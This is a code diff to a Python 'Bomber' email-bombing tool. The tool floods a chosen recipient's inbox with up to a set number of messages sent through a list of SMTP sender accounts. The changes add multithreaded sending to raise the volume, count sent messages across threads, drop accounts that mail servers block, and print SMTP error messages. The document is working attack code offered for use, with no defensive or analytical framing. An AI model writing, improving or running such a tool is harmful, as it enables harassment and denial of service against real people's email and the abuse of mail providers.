@@ -2,6 +2,7 @@ import sys
 import time
 from random import randint
 import smtplib
+import threading
 
 from essential_generators import DocumentGenerator
 
@@ -9,13 +10,14 @@ from essential_generators import DocumentGenerator
 
 class Bomber:
     '''This is the bomber class that contains email-bombing functions and methods'''
-
+    num_sent = 0
     gen = DocumentGenerator()
 
     def __init__(self, argv):
         self.receiving_email = argv[0]
         self.max_num_emails = int(argv[1])
         self.account_ind = 0
+
         if len(argv) == 4:
             self.subject, self.body, self.auto_gen = argv[2], argv[3], False
         else:
@@ -30,22 +32,28 @@ class Bomber:
 
     def start(self):
         send_algo = Bomber.prompt('''[PROMPT] Press (1) for randomized sending, or press (2) for linear sending. The former is suggested: ''')
-        Bomber.random_sending(self) if send_algo == 1 else Bomber.linear_sending(self)
-
-
+        if send_algo == 1:
+          num_threads = Bomber.prompt('''[PROMPT] Enter the number of threads: ''')
+          if num_threads == 1:
+            Bomber.random_sending(self)
+          else:
+            for i in range(num_threads):
+                threading.Thread(target=Bomber.random_sending, args=(self,)).start()
+        else:
+          Bomber.linear_sending(self)
+  
     def random_sending(self):
       not_finished = True
-      num_sent = 0
       while not_finished:
           rand_ind = randint(0, len(self.sending_email) - 1)
           if isinstance(Bomber.send(self, self.sending_email[rand_ind], self.sending_passwd[rand_ind]), int):
-              print(f"Blocked {self.sending_email[rand_ind]}") #debug
+              # print(f"Blocked {self.sending_email[rand_ind]}") #debug
               print(f"Removing {self.sending_email.pop(rand_ind)} from the list")
           else:
-            num_sent += 1
+            Bomber.num_sent += 1
             curr_email = self.sending_email[rand_ind]
-            print(f"[{num_sent}/{self.max_num_emails}] total emails have been sent. The current email is {curr_email}")
-            if num_sent >= self.max_num_emails: not_finished = False
+            print(f"[{Bomber.num_sent}/{self.max_num_emails}] total emails have been sent. The current email is {curr_email}")
+            if Bomber.num_sent >= self.max_num_emails: not_finished = False
       print("\nDONE !!!")
 
     #sequentially iterates over the accounts.txt and swtiches only when SMTP connection gets closed
@@ -79,22 +87,26 @@ class Bomber:
             server.login(sending_email, sending_passwd)
             server.sendmail(sending_email, self.receiving_email, msg)
         except KeyboardInterrupt:
-            print("\n[-] ctrl+C was pressed. quitting...")
+            print("\n[-] CTRL+C was pressed. quitting...")
             sys.exit()
         except smtplib.SMTPSenderRefused:
+            print("[ERROR] SMTP Sender Refused: ", end = "")
             return 1
         except smtplib.SMTPDataError:
+            print("[ERROR] SMTP Data Error: ", end = "")
             return 2
         except smtplib.SMTPAuthenticationError:
+            print("[ERROR] SMTP Authentication Error: ", end = "")
             return 3
         except smtplib.SMTPServerDisconnected:
+            print("[ERROR] SMTP Server Disconnected: ", end = "")
             return 4
 
     def prompt(str):
         while True:
             try:
                 response = int(input(str))
-                if response not in [1, 2]:
+                if response not in range(50):
                     raise ValueError
                 else:
                     break
